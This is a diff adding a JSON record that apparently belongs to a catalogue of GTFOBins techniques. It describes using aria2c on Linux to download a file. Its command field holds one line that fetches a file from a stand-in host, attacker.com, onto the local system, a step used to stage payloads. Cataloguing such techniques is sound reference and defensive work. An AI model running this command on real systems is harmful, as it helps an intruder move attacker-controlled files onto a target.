@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-aria2c-download",
+  "name": "GTFOBins · aria2c (download)",
+  "command": "aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file",
+  "description": "Use aria2c to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "aria2c",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/aria2c/#download",
+  "upstream_id": "aria2c/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/aria2c/"
+    }
+  ]
+}
